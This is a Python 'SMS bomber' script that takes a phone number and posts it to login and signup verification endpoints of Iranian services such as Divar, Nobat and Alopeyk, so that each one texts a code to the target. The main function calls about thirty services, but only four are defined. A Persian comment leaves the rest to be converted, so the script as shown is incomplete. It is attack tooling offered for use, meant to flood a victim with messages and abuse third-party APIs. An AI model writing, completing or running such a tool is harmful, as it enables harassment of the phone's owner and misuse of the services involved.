import requests
import json
import time
import random
import string

def all(phone):
    divar(phone)
    nobatir(phone)
    alopeyk_login(phone)  
    alopeyk_signup(phone)  
    shahrefarsh(phone)
    digistyle(phone)  
    snapp_express(phone)
    azki(phone)
    digikala_jet(phone)
    snapp_drivers(phone)
    ostadkar(phone)
    miare(phone)
    tapsi_drivers(phone)
    tapsi_passenger(phone)
    banimode(phone)
    taaghche_login(phone)
    taaghche_signup(phone)
    mobit(phone)
    jabama(phone)
    ghabzino(phone)
    komodaa(phone)
    barghe_man(phone)
    vandar(phone)
    pinorest(phone)
    tetherland(phone)
    alibaba(phone)
    drdr(phone)
    drnext(phone)
    classino(phone)
    takshopaccessorise(phone)

def generateRandomString(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def CURL_SMS(URL, PHONE_VALUE, HEADER1=None, HEADER2=None):
    response = None
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    try:
        headers = {}
        if HEADER1:
            headers['Content-Type'] = HEADER1
        if HEADER2:
            headers['client-id'] = HEADER2

        response = requests.post(URL, data=PHONE_VALUE.encode('utf-8'), headers=headers)
        with open('log.txt', 'a') as logfile:
            logfile.write(f'[{timestamp}--URL={URL}] {response.text}\n\n')

        time.sleep(2)
    except Exception as e:
        print("خطا:", e)

def divar(phone):
    url = 'https://api.divar.ir/v5/auth/authenticate'
    phone_value = json.dumps({"phone": phone})
    CURL_SMS(url, phone_value)

def nobatir(phone):
    url = 'https://nobat.ir/api/public/patient/login/phone'
    phone_value = f"------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n{phone}\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n"
    header = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'
    CURL_SMS(url, phone_value, header)

def alopeyk_login(phone):
    phone = int(phone)  
    url = 'https://api.alopeyk.com/api/v2/login?platform=pwa'
    phone_value = json.dumps({
        "type": "CUSTOMER",
        "model": "Chrome 111.0.0.0",
        "platform": "pwa",
        "version": "10",
        "manufacturer": "Windows",
        "isVirtual": False,
        "serial": True,
        "app_version": "1.2.9",
        "uuid": True,
        "phone": str(phone)  
    })
    header = 'content-type: application/json'
    CURL_SMS(url, phone_value, header)

def alopeyk_signup(phone):
    url = 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa'
    phone_value = json.dumps({
        "type": "CUSTOMER",
        "model": "Chrome 111.0.0.0",
        "platform": "pwa",
        "version": "10",
        "manufacturer": "Windows",
        "isVirtual": False,
        "serial": True,
        "app_version": "1.2.9",
        "uuid": True,
        "firstname": "تست",
        "lastname": "تست",
        "phone": phone,
        "email": "",
        "referred_by": "",
        "lat": None,
        "lng": None
    })
    header = 'content-type: application/json'
    CURL_SMS(url, phone_value, header)

# مابقی توابع مربوط به ارسال پیامک‌ها را به صورت مشابه به Python تبدیل کنید

# مثال برای فراخوانی تابع
phone_number = str(input("Made by baji inter phone number (+98xxxxxxx): "))
all(phone_number)
